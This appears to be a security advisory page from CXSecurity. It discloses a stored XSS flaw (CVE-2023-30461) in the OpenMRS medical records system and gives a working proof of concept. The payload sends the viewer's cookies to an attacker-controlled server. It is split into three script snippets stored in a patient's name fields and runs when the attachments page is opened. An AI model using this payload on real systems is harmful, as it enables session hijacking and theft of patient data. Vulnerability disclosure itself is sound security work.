---
title: OpenMRS V2.4.2, 2.12.2 Stored XSS Vulnerabiltiy
url: https://cxsecurity.com/issue/WLB-2023040047
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2023-04-11
fetch_date: 2025-10-04T11:29:14.616215
---

# OpenMRS V2.4.2, 2.12.2 Stored XSS Vulnerabiltiy

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **OpenMRS V2.4.2, 2.12.2 Stored XSS Vulnerabiltiy** **2023.04.10**  **![ca](https://cert.cx/cxstatic/images/flags/ca.png) [Omar Tsai](https://cxsecurity.com/author/Omar%2BTsai/1/) **(CA)** ![ca](https://cert.cx/cxstatic/images/flags/ca.png)**  Risk: **Low**  Local: **No**  Remote: ****Yes****  CVE: **[CVE-2023-30461](https://cxsecurity.com/cveshow/CVE-2023-30461/ "Click to see CVE-2023-30461")**  CWE: **N/A** | |

# Exploit Title: OpenMRS XSS Vulnerability in Attachments
# Date: 2023-04-09
# Exploit Author: Omar Tsai
# Vendor Homepage: https://openmrs.org/
# Software Link: https://openmrs.org/download/
# Version: 2.4.2, 2.12.2
# Tested on: OpenMRS 2.4.2, 2.12.2 Standalone
# CVE : CVE-2023-30461
# Proof-of-concept for XSS OpenMRS 2.4.2, 2.12,2
In this example, I will demonstrate a simple cookie-stealing attack using the three fields in a patient (First name, Middle name, and Last name).
## 1. Figure out the XSS payload
```sh
<script>$.get(`https://<my\_server>/?`+document.cookie);</script>
```
Now we have to split this into 50-character limited chunks since each name field is limited to 50 characters only. Note that the backtick is needed for quotes since quotations are escaped in the field.
## 2. Split up the XSS payload into 3 parts
I will split the payload into 3 parts using a variable and the final jquery request:
\*\*For the first name:\*\*
```sh
<script>var a=`https://my-own`</script>
```
\*\*For the middle name:\*\*
```sh
<script>a+=`-simpledomain.cp,/?`</script>
```
\*\*For the last name:\*\*
```sh
<script>$.get(a+document.cookie);</script>
```
## 3. Save the patient information
Just click save
## 4. Execute XSS attack
The XSS attack can be triggered by going to the `attachments` page of the patient.
## 5. Get cookies
If you look back at your server logs, a GET request will have been initiated with the user's cookies

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2023040047)

[Tweet](https://twitter.com/share)

Vote for this issue:
 0
 0

50%

50%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2025**, cxsecurity.com

|  |

Back to Top